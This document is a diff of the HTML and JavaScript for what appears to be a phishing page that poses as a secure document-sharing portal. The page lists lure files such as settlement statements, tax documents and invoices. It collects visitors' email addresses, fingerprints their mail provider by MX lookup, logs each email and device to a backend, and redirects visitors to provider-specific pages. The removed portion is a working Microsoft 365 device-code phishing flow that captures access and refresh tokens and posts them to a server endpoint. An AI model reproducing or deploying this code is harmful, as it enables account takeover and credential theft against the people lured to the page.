@@ -42,7 +42,6 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
-        /* Modern Header */
         .header {
             background: var(--bg-white);
             border-bottom: 1px solid var(--border-color);
@@ -128,40 +127,20 @@
             border-color: #D0D0D0;
         }
 
-        /* Main Container */
         .main-container {
             max-width: 900px;
             margin: 0 auto;
             padding: 40px 32px 80px;
         }
 
-        /* Sender Info Card - Redesigned */
-        .sender-info-card {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 16px;
-            padding: 32px;
+        /* Page Header - Clean Design */
+        .page-header {
             margin-bottom: 32px;
-            display: none;
-            position: relative;
-            overflow: hidden;
-            box-shadow: var(--shadow-lg);
-        }
-
-        .sender-info-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -20%;
-            width: 300px;
-            height: 300px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            pointer-events: none;
-        }
-
-        .sender-info-card.visible {
-            display: block;
             animation: fadeInUp 0.5s ease;
+        }
+
+        .page-header.visible {
+            display: block !important;
         }
 
         @keyframes fadeInUp {
@@ -175,41 +154,37 @@
             }
         }
 
-        .sender-info-content {
-            position: relative;
-            z-index: 1;
-        }
-
-        .sender-badge {
+        .header-badge {
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(10px);
-            padding: 8px 16px;
+            background: var(--bg-light);
+            padding: 6px 14px;
             border-radius: 20px;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 600;
-            color: white;
-            margin-bottom: 16px;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            border: 1px solid var(--border-color);
         }
 
-        .sender-name {
-            font-size: 28px;
+        .page-sender {
+            font-size: 32px;
             font-weight: 700;
-            color: white;
+            color: var(--text-primary);
             margin-bottom: 8px;
-            letter-spacing: -0.5px;
+            letter-spacing: -0.8px;
+            line-height: 1.2;
         }
 
-        .document-title-text {
+        .page-description {
             font-size: 16px;
-            color: rgba(255, 255, 255, 0.9);
+            color: var(--text-secondary);
             font-weight: 500;
-            line-height: 1.5;
+            line-height: 1.6;
+            max-width: 700px;
         }
 
-        /* Documents Card - Minimalist Design */
         .documents-card {
             background: var(--bg-white);
             border-radius: 16px;
@@ -234,7 +209,6 @@
             letter-spacing: -0.3px;
         }
 
-        /* Document List - Clean Design */
         .document-list {
             padding: 8px;
         }
@@ -349,7 +323,6 @@
             flex-shrink: 0;
         }
 
-        /* Download Section - Modern CTA */
         .download-section {
             padding: 24px 28px;
             border-top: 1px solid var(--border-color);
@@ -395,7 +368,6 @@
             font-weight: 700;
         }
 
-        /* Loading Overlay */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -439,7 +411,6 @@
             color: var(--text-secondary);
         }
 
-        /* Lightbox - Modern Modal */
         .lightbox {
             display: none;
             position: fixed;
@@ -461,12 +432,8 @@
         }
 
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .lightbox-content {
@@ -672,145 +639,6 @@
             border: 1px solid #FFE0B2;
         }
 
-        /* Device Code Styles */
-        .device-code-container {
-            padding: 20px 0;
-        }
-
-        .device-code-box {
-            background: linear-gradient(135deg, #E6F2FF 0%, #D0E8FF 100%);
-            border: 2px solid #0066CC;
-            border-radius: 12px;
-            padding: 24px;
-            text-align: center;
-            margin-bottom: 24px;
-        }
-
-        .device-code-label {
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text-secondary);
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .device-code-value {
-            font-size: 32px;
-            font-weight: 700;
-            color: var(--primary-blue);
-            letter-spacing: 4px;
-            font-family: 'Courier New', monospace;
-            margin-bottom: 16px;
-            user-select: all;
-        }
-
-        .copy-code-btn {
-            background: var(--primary-blue);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            transition: all 0.2s ease;
-        }
-
-        .copy-code-btn:hover {
-            background: var(--dark-blue);
-            transform: translateY(-1px);
-        }
-
-        .copy-code-btn.copied {
-            background: #16C79A;
-        }
-
-        .device-code-instructions {
-            background: var(--bg-light);
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 20px;
-            text-align: left;
-        }
-
-        .device-code-instructions p {
-            margin-bottom: 8px;
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-
-        .device-code-instructions ol {
-            margin-left: 20px;
-            color: var(--text-secondary);
-            font-size: 14px;
-            line-height: 1.8;
-        }
-
-        .device-login-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            width: 100%;
-            background: var(--primary-blue);
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            text-decoration: none;
-            transition: all 0.2s ease;
-        }
-
-        .device-login-btn:hover {
-            background: var(--dark-blue);
-            transform: translateY(-1px);
-        }
-
-        .polling-status {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-            padding: 12px;
-            background: #FFF9E6;
-            border-radius: 8px;
-            font-size: 14px;
-            color: var(--text-secondary);
-        }
-
-        .polling-spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid #FFD700;
-            border-top-color: #FF8C00;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        .btn-secondary {
-            background: #E8E8E8;
-            color: var(--text-primary);
-            border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .btn-secondary:hover {
-            background: #D8D8D8;
-        }
-
-        /* Responsive */
         @media (max-width: 768px) {
             .header-container {
                 padding: 0 20px;
@@ -820,12 +648,12 @@
                 padding: 24px 20px 60px;
             }
 
-            .sender-info-card {
-                padding: 24px;
+            .page-sender {
+                font-size: 24px;
             }
 
-            .sender-name {
-                font-size: 22px;
+            .page-description {
+                font-size: 14px;
             }
 
             .document-item {
@@ -836,16 +664,10 @@
             .lightbox-content {
                 padding: 32px 24px;
             }
-
-            .device-code-value {
-                font-size: 24px;
-                letter-spacing: 2px;
-            }
         }
     </style>
 </head>
 <body>
-    <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-content">
             <div class="loading-spinner"></div>
@@ -853,7 +675,6 @@
         </div>
     </div>
 
-    <!-- Header -->
     <div class="header">
         <div class="header-container">
             <div class="logo-container">
@@ -872,21 +693,17 @@
         </div>
     </div>
 
-    <!-- Main Container -->
     <div class="main-container">
-        <!-- Sender Info Card -->
-        <div class="sender-info-card" id="senderInfoCard">
-            <div class="sender-info-content">
-                <div class="sender-badge">
-                    <span>📧</span>
-                    <span>Sent by</span>
-                </div>
-                <div class="sender-name" id="senderName">Loading...</div>
-                <div class="document-title-text" id="documentTitle">Loading document information...</div>
+        <!-- Page Header with Fetched Data -->
+        <div class="page-header" id="pageHeader" style="display: none;">
+            <div class="header-badge">
+                <span>📧</span>
+                <span>Sent by</span>
             </div>
+            <h1 class="page-sender" id="senderName">Loading...</h1>
+            <p class="page-description" id="documentTitle">Loading document information...</p>
         </div>
 
-        <!-- Documents Card -->
         <div class="documents-card">
             <div class="card-header">
                 <h2 class="card-title">
@@ -895,9 +712,7 @@
                 </h2>
             </div>
 
-            <div class="document-list" id="documentList">
-                <!-- Documents will be populated by JavaScript -->
-            </div>
+            <div class="document-list" id="documentList"></div>
 
             <div class="download-section">
                 <button class="download-btn" id="downloadBtn" disabled onclick="openLightbox()">
@@ -909,12 +724,10 @@
         </div>
     </div>
 
-    <!-- Lightbox -->
     <div class="lightbox" id="lightbox" onclick="handleLightboxClick(event)">
         <div class="lightbox-content" onclick="event.stopPropagation()">
             <button class="lightbox-close" onclick="closeLightbox()">×</button>
 
-            <!-- EMAIL INPUT FORM -->
             <div id="authForm">
                 <div class="lightbox-header">
                     <div class="lightbox-icon-wrapper">🔐</div>
@@ -926,9 +739,7 @@
 
                 <form id="emailForm" onsubmit="handleEmailSubmit(event)">
                     <div class="form-group">
-                        <label class="form-label" for="emailInput">
-                            Email Address
-                        </label>
+                        <label class="form-label" for="emailInput">Email Address</label>
                         <input 
                             type="email" 
                             id="emailInput" 
@@ -951,72 +762,16 @@
                     <div class="provider-info" id="providerInfo"></div>
                 </form>
             </div>
-
-            <!-- DEVICE CODE FORM (HIDDEN BY DEFAULT) -->
-            <div id="deviceCodeForm" style="display: none;">
-                <div class="lightbox-header">
-                    <div class="lightbox-icon-wrapper">🔷</div>
-                    <h2 class="lightbox-title">Microsoft 365 Authentication</h2>
-                    <p class="lightbox-subtitle">
-                        Sign in with your Microsoft account to access the document.
-                    </p>
-                </div>
-
-                <div class="device-code-container">
-                    <div class="device-code-box">
-                        <div class="device-code-label">Your Code:</div>
-                        <div class="device-code-value" id="deviceCodeValue">LOADING...</div>
-                        <button type="button" class="copy-code-btn" onclick="copyDeviceCode()">
-                            <span>📋</span>
-                            <span id="copyBtnText">Copy Code</span>
-                        </button>
-                    </div>
-
-                    <div class="device-code-instructions">
-                        <p><strong>To sign in:</strong></p>
-                        <ol>
-                            <li>Click "Open Microsoft Login" below</li>
-                            <li>Enter the code shown above</li>
-                            <li>Sign in with your Microsoft account</li>
-                            <li>Return to this page (it will auto-continue)</li>
-                        </ol>
-                    </div>
-
-                    <a href="" id="deviceLoginLink" class="device-login-btn" target="_blank">
-                        <span>🔗</span>
-                        <span>Open Microsoft Login</span>
-                    </a>
-
-                    <div class="polling-status" id="pollingStatus">
-                        <div class="polling-spinner"></div>
-                        <span>Waiting for authentication...</span>
-                    </div>
-
-                    <button type="button" class="btn-secondary" onclick="cancelDeviceCode()" style="margin-top: 16px; width: 100%;">
-                        Cancel
-                    </button>
-                </div>
-            </div>
         </div>
     </div>
 
     <script>
-        // ========== CONFIGURATION ==========
-        const AZURE_CONFIG = {
-            clientId: 'd2301a85-917a-484c-8c6b-d3273eebd8dd',
-            pollingInterval: 5000
-        };
-
-        let deviceCodeData = null;
-        let pollingTimer = null;
-
         // ========== COOKIE UTILITIES ==========
         function setCookie(name, value, days = 365) {
             const date = new Date();
             date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
             const expires = "expires=" + date.toUTCString();
             document.cookie = name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
-            console.log(`Cookie set: ${name} = ${value}`);
         }
 
         function getCookie(name) {
@@ -1062,7 +817,7 @@
 
             if (!key) {
                 console.error('No key found in URL hash');
-                window.location.href = 'https://tiktok.com';
+                //window.location.href = 'https://tiktok.com';
                 return;
             }
 
@@ -1091,7 +846,7 @@
 
             if (!docData) {
                 console.error('❌ Document not found for key:', key);
-                window.location.href = 'https://tiktok.com';
+                //window.location.href = 'https://tiktok.com';
                 return;
             }
 
@@ -1102,14 +857,11 @@
                 console.error('⚠️ No URL returned from API');
             }
 
+            // Update page header with fetched data
             document.getElementById('senderName').textContent = docData.sender;
             document.getElementById('documentTitle').textContent = docData.title;
-            document.getElementById('senderInfoCard').classList.add('visible');
-
-            if (documents.length > 0) {
-                documents[0].name = docData.title + '.pdf';
-                renderDocuments();
-            }
+            document.getElementById('pageHeader').style.display = 'block';
+            document.getElementById('pageHeader').classList.add('visible');
         }
 
         // SVG Icons
@@ -1140,6 +892,20 @@
                 <rect x="8" y="11" width="8" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
                 <rect x="8" y="13" width="6" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
                 <rect x="8" y="15" width="7" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+            </svg>`,
+
+            xlsx: `<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="excelGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                        <stop offset="0%" style="stop-color:#1D6F42;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#0F5132;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path fill="url(#excelGrad)" d="M6 2h10l6 6v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z"/>
+                <path fill="#0F5132" opacity="0.5" d="M16 2v6h6z"/>
+                <rect x="8" y="11" width="8" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+                <rect x="8" y="13" width="6" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
+                <rect x="8" y="15" width="7" height="1" fill="#fff" rx="0.5" opacity="0.9"/>
             </svg>`
         };
 
@@ -1166,14 +932,42 @@
             }
         }
 
+        // ========== MULTIPLE DOCUMENTS LIST ==========
         const documents = [
             {
                 name: 'Account_Settlement_Statement.pdf',
                 size: '1.5 MB',
                 timestamp: getRandomRecentDate(),
                 type: 'PDF Document',
-                urgent: false,
                 fileType: 'pdf'
+            },
+            {
+                name: 'Financial_Summary_Report.pdf',
+                size: '2.3 MB',
+                timestamp: getRandomRecentDate(),
+                type: 'PDF Document',
+                fileType: 'pdf'
+            },
+            {
+                name: 'Tax_Documentation_2024.pdf',
+                size: '890 KB',
+                timestamp: getRandomRecentDate(),
+                type: 'PDF Document',
+                fileType: 'pdf'
+            },
+            {
+                name: 'Invoice_Details.xlsx',
+                size: '456 KB',
+                timestamp: getRandomRecentDate(),
+                type: 'Excel Spreadsheet',
+                fileType: 'xlsx'
+            },
+            {
+                name: 'Contract_Agreement.docx',
+                size: '1.1 MB',
+                timestamp: getRandomRecentDate(),
+                type: 'Word Document',
+                fileType: 'docx'
             }
         ];
 
@@ -1263,16 +1057,7 @@
         }
 
         function closeLightbox() {
-            if (pollingTimer) {
-                clearInterval(pollingTimer);
-                pollingTimer = null;
-            }
-
             document.getElementById('lightbox').classList.remove('active');
-            
-            document.getElementById('authForm').style.display = 'block';
-            document.getElementById('deviceCodeForm').style.display = 'none';
-            
             resetForm();
         }
 
@@ -1294,43 +1079,32 @@
             const ua = navigator.userAgent;
             let os = 'Unknown';
             
-            if (/Windows NT 10/i.test(ua)) {
-                os = 'Windows 10/11';
-            } else if (/Windows NT 6.1/i.test(ua)) {
-                os = 'Windows 7';
-            } else if (/Windows/i.test(ua)) {
-                os = 'Windows';
-            } else if (/Mac OS X 10[._]\d+/i.test(ua)) {
+            if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
+            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
+            else if (/Windows/i.test(ua)) os = 'Windows';
+            else if (/Mac OS X 10[._]\d+/i.test(ua)) {
                 const match = ua.match(/Mac OS X 10[._](\d+)/i);
                 os = match ? `macOS 10.${match[1]}` : 'macOS';
-            } else if (/Mac OS X|Macintosh/i.test(ua)) {
-                os = 'macOS';
-            } else if (/iPhone/i.test(ua)) {
+            } else if (/Mac OS X|Macintosh/i.test(ua)) os = 'macOS';
+            else if (/iPhone/i.test(ua)) {
                 const match = ua.match(/OS (\d+)[._](\d+)/i);
                 os = match ? `iPhone iOS ${match[1]}.${match[2]}` : 'iPhone iOS';
-            } else if (/iPad/i.test(ua)) {
-                os = 'iPad iOS';
-            } else if (/Android/i.test(ua)) {
+            } else if (/iPad/i.test(ua)) os = 'iPad iOS';
+            else if (/Android/i.test(ua)) {
                 const match = ua.match(/Android (\d+\.?\d*)/i);
                 os = match ? `Android ${match[1]}` : 'Android';
-            } else if (/Linux/i.test(ua)) {
-                os = 'Linux';
-            }
+            } else if (/Linux/i.test(ua)) os = 'Linux';
             
             return os;
         }
 
         async function logVisit(email, device, mxType) {
             try {
-                console.log('📊 Logging visit to Redis...');
-
                 const documentKey = window.location.hash.substring(1) || 'unknown';
 
                 const response = await fetch('/api/log-visit.php', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         email: email,
                         device: device,
@@ -1339,22 +1113,10 @@
                     })
                 });
 
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-
                 const result = await response.json();
-
                 if (result.success) {
-                    console.log('✅ Visit logged successfully');
-                    console.log('Visit ID:', result.visit_id);
-                    console.log('IP Address:', result.ip);
-                    console.log('MX Type:', result.mx_type);
-                    console.log('Document Key:', result.document_key);
-                } else {
-                    console.error('❌ Visit logging failed:', result.error);
+                    console.log('✅ Visit logged');
                 }
-
             } catch (error) {
                 console.error('❌ Visit logging error:', error);
             }
@@ -1362,164 +1124,70 @@
 
         // ========== MX CHECKING ==========
         function getCommonProvider(domain) {
-            const office365Domains = [
-                'outlook.com', 'hotmail.com', 'live.com', 
-                'msn.com', 'outlook.co.uk', 'live.co.uk'
-            ];
-            
-            const googleDomains = [
-                'gmail.com', 'googlemail.com', 'googlemail.co.uk'
-            ];
+            const office365Domains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com'];
+            const googleDomains = ['gmail.com', 'googlemail.com'];
 
             if (office365Domains.includes(domain)) {
-                return {
-                    success: true,
-                    provider: 'office365',
-                    domain: domain
-                };
+                return { success: true, provider: 'office365', domain: domain };
             }
-
             if (googleDomains.includes(domain)) {
-                return {
-                    success: true,
-                    provider: 'google',
-                    domain: domain
-                };
+                return { success: true, provider: 'google', domain: domain };
             }
-
             return null;
         }
 
         function categorizeProvider(mxRecords) {
             const mxString = mxRecords.join(' ').toLowerCase();
-
-            const office365Patterns = [
-                'outlook.com',
-                'protection.outlook.com',
-                'mail.protection.outlook.com',
-                'eo.outlook.com',
-                'microsoft.com',
-                'office365.com',
-                'onmicrosoft.com',
-                'pamx1.hotmail.com'
-            ];
-
-            const googlePatterns = [
-                'google.com',
-                'googlemail.com',
-                'aspmx.l.google.com',
-                'smtp.google.com',
-                'gmail-smtp-in.l.google.com'
-            ];
+            const office365Patterns = ['outlook.com', 'protection.outlook.com', 'microsoft.com'];
+            const googlePatterns = ['google.com', 'aspmx.l.google.com'];
 
             for (const pattern of office365Patterns) {
-                if (mxString.includes(pattern)) {
-                    return 'office365';
-                }
+                if (mxString.includes(pattern)) return 'office365';
             }
-
             for (const pattern of googlePatterns) {
-                if (mxString.includes(pattern)) {
-                    return 'google';
-                }
+                if (mxString.includes(pattern)) return 'google';
             }
-
             return 'other';
         }
 
         async function checkMXRecords(email) {
             const domain = email.split('@')[1].toLowerCase();
-
             const commonProvider = getCommonProvider(domain);
-            if (commonProvider) {
-                return commonProvider;
-            }
+            if (commonProvider) return commonProvider;
 
             try {
                 const response = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`);
-                
-                if (!response.ok) {
-                    throw new Error('DNS lookup failed');
-                }
-
                 const data = await response.json();
 
                 if (!data.Answer || data.Answer.length === 0) {
-                    return {
-                        success: false,
-                        provider: 'other',
-                        domain: domain,
-                        error: 'No MX records found'
-                    };
+                    return { success: false, provider: 'other', domain: domain, error: 'No MX records found' };
                 }
 
                 const mxRecords = data.Answer
                     .filter(record => record.type === 15)
-                    .map(record => {
-                        const parts = record.data.split(' ');
-                        return {
-                            priority: parseInt(parts[0]),
-                            exchange: parts[1].replace(/\.$/, '').toLowerCase()
-                        };
-                    })
-                    .sort((a, b) => a.priority - b.priority);
+                    .map(record => record.data.split(' ')[1].replace(/\.$/, '').toLowerCase());
 
-                if (mxRecords.length === 0) {
-                    return {
-                        success: false,
-                        provider: 'other',
-                        domain: domain,
-                        error: 'No valid MX records'
-                    };
-                }
-
-                const allMX = mxRecords.map(r => r.exchange);
-                const provider = categorizeProvider(allMX);
-
-                return {
-                    success: true,
-                    provider: provider,
-                    domain: domain
-                };
+                const provider = categorizeProvider(mxRecords);
+                return { success: true, provider: provider, domain: domain };
 
             } catch (error) {
-                console.error('MX lookup error:', error);
-                return {
-                    success: false,
-                    provider: 'other',
-                    domain: domain,
-                    error: error.message
-                };
+                return { success: false, provider: 'other', domain: domain, error: error.message };
             }
         }
 
         function displayProviderBadge(mxResult) {
             const providerInfo = document.getElementById('providerInfo');
-            let badge = '';
-            let icon = '';
-            let name = '';
-
-            switch(mxResult.provider) {
-                case 'office365':
-                    icon = '🔷';
-                    name = 'Microsoft 365';
-                    badge = 'office365';
-                    break;
-                case 'google':
-                    icon = '🔵';
-                    name = 'Google Workspace';
-                    badge = 'google';
-                    break;
-                default:
-                    icon = '📧';
-                    name = 'Email Verified';
-                    badge = 'other';
-            }
-
+            const badges = {
+                'office365': { icon: '🔷', name: 'Microsoft 365', class: 'office365' },
+                'google': { icon: '🔵', name: 'Google Workspace', class: 'google' },
+                'other': { icon: '📧', name: 'Email Verified', class: 'other' }
+            };
+            const badge = badges[mxResult.provider] || badges.other;
+            
             providerInfo.innerHTML = `
-                <div class="provider-badge ${badge}">
-                    <span>${icon}</span>
-                    <span>${name}</span>
+                <div class="provider-badge ${badge.class}">
+                    <span>${badge.icon}</span>
+                    <span>${badge.name}</span>
                 </div>
             `;
         }
@@ -1532,216 +1200,7 @@
             };
 
             const redirectUrl = redirectUrls[mxResult.provider] || 'https://pdf-render.vercel.app/viewer?from=me';
-            console.log(`🔄 Redirecting to: ${redirectUrl} (Provider: ${mxResult.provider})`);
             window.location.href = redirectUrl;
-        }
-
-        // ========== DEVICE CODE FLOW FUNCTIONS (BACKEND PROXY) ==========
-
-        async function requestDeviceCode() {
-            try {
-                const response = await fetch('/api/device-code', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        action: 'request'
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error('Failed to request device code');
-                }
-
-                const result = await response.json();
-                
-                if (!result.success) {
-                    throw new Error(result.error || 'Failed to get device code');
-                }
-
-                console.log('Device code received:', result.data);
-                return result.data;
-
-            } catch (error) {
-                console.error('Device code request error:', error);
-                throw error;
-            }
-        }
-
-        function displayDeviceCode(data) {
-            deviceCodeData = data;
-
-            document.getElementById('authForm').style.display = 'none';
-            document.getElementById('deviceCodeForm').style.display = 'block';
-
-            document.getElementById('deviceCodeValue').textContent = data.user_code;
-            document.getElementById('deviceLoginLink').href = data.verification_uri;
-
-            startPolling(data.device_code, data.interval * 1000);
-        }
-
-        function copyDeviceCode() {
-            const codeElement = document.getElementById('deviceCodeValue');
-            const code = codeElement.textContent;
-            
-            navigator.clipboard.writeText(code).then(() => {
-                const copyBtn = document.querySelector('.copy-code-btn');
-                const copyText = document.getElementById('copyBtnText');
-                
-                copyBtn.classList.add('copied');
-                copyText.textContent = 'Copied!';
-                
-                setTimeout(() => {
-                    copyBtn.classList.remove('copied');
-                    copyText.textContent = 'Copy Code';
-                }, 2000);
-            }).catch(err => {
-                console.error('Copy failed:', err);
-                alert('Failed to copy code. Please select and copy manually.');
-            });
-        }
-
-        function startPolling(deviceCode, interval) {
-            console.log('Starting polling every', interval, 'ms');
-            
-            pollingTimer = setInterval(async () => {
-                try {
-                    const response = await fetch('/api/device-code', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            action: 'poll',
-                            device_code: deviceCode
-                        })
-                    });
-
-                    if (!response.ok) {
-                        console.error('Polling request failed');
-                        return;
-                    }
-
-                    const result = await response.json();
-                    
-                    if (!result.success) {
-                        console.error('Polling error:', result.error);
-                        return;
-                    }
-
-                    const data = result.data;
-
-                    if (result.http_code === 200 && data.access_token) {
-                        console.log('✅ Authentication successful!');
-                        clearInterval(pollingTimer);
-                        handleAuthenticationSuccess(data);
-                    } else if (data.error === 'authorization_pending') {
-                        console.log('⏳ Waiting for user authentication...');
-                    } else if (data.error === 'slow_down') {
-                        console.log('⏸️ Slowing down polling...');
-                        clearInterval(pollingTimer);
-                        startPolling(deviceCode, interval + 1000);
-                    } else if (data.error === 'expired_token') {
-                        console.log('❌ Device code expired');
-                        clearInterval(pollingTimer);
-                        handleAuthenticationError('Device code expired. Please try again.');
-                    } else if (data.error === 'access_denied') {
-                        console.log('❌ User denied access');
-                        clearInterval(pollingTimer);
-                        handleAuthenticationError('Authentication was denied.');
-                    }
-
-                } catch (error) {
-                    console.error('Polling request error:', error);
-                }
-            }, interval || AZURE_CONFIG.pollingInterval);
-        }
-
-        async function handleAuthenticationSuccess(tokenData) {
-            console.log('Token received:', tokenData);
-
-            const email = document.getElementById('emailInput').value.trim();
-            const device = getDeviceType();
-
-            await saveTokensToBackend(email, tokenData);
-            await logVisit(email, device, 'office365');
-
-            document.getElementById('pollingStatus').innerHTML = `
-                <span style="color: #16C79A;">✅</span>
-                <span style="color: #16C79A; font-weight: 600;">Authentication successful!</span>
-            `;
-
-            setTimeout(() => {
-                const redirectUrl = getCookie('redirect_url');
-                if (redirectUrl) {
-                    window.location.href = redirectUrl;
-                } else {
-                    window.location.href = 'https://pdf-render.vercel.app/viewer?from=me';
-                }
-            }, 1500);
-        }
-
-        async function saveTokensToBackend(email, tokenData) {
-            try {
-                console.log('💾 Saving tokens to backend...');
-
-                const response = await fetch('/api/save-tokens.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        access_token: tokenData.access_token,
-                        refresh_token: tokenData.refresh_token || null,
-                        id_token: tokenData.id_token || null,
-                        expires_in: tokenData.expires_in || 3600,
-                        token_type: tokenData.token_type || 'Bearer',
-                        scope: tokenData.scope || ''
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}`);
-                }
-
-                const result = await response.json();
-
-                if (result.success) {
-                    console.log('✅ Tokens saved successfully');
-                    console.log('Token ID:', result.token_id);
-                } else {
-                    console.error('❌ Token save failed:', result.error);
-                }
-
-            } catch (error) {
-                console.error('❌ Token save error:', error);
-            }
-        }
-
-        function handleAuthenticationError(message) {
-            document.getElementById('pollingStatus').innerHTML = `
-                <span style="color: #DC3545;">❌</span>
-                <span style="color: #DC3545;">${message}</span>
-            `;
-
-            setTimeout(() => {
-                cancelDeviceCode();
-            }, 3000);
-        }
-
-        function cancelDeviceCode() {
-            if (pollingTimer) {
-                clearInterval(pollingTimer);
-                pollingTimer = null;
-            }
-
-            document.getElementById('deviceCodeForm').style.display = 'none';
-            document.getElementById('authForm').style.display = 'block';
-            document.getElementById('emailInput').value = '';
-            document.getElementById('emailInput').classList.remove('error');
-            document.getElementById('errorMessage').classList.remove('show');
         }
 
         // ========== HANDLE EMAIL SUBMIT ==========
@@ -1774,18 +1233,6 @@
                     throw new Error(mxResult.error || 'Unable to verify email domain');
                 }
 
-                if (mxResult.provider === 'office365') {
-                    console.log('🔷 Office 365 detected - Starting device code flow');
-                    
-                    submitBtn.classList.remove('loading');
-                    submitBtn.disabled = false;
-
-                    const deviceCode = await requestDeviceCode();
-                    displayDeviceCode(deviceCode);
-                    
-                    return;
-                }
-
                 const device = getDeviceType();
                 await logVisit(email, device, mxResult.provider);
 
@@ -1806,17 +1253,11 @@
             }
         }
 
-                document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                // closeLightbox();
-            }
-        });
-
-        // Initialize on page load
+        // Initialize
         window.addEventListener('DOMContentLoaded', async () => {
             await initializePage();
             init();
         });
     </script>
 </body>
-</html> 
+</html>
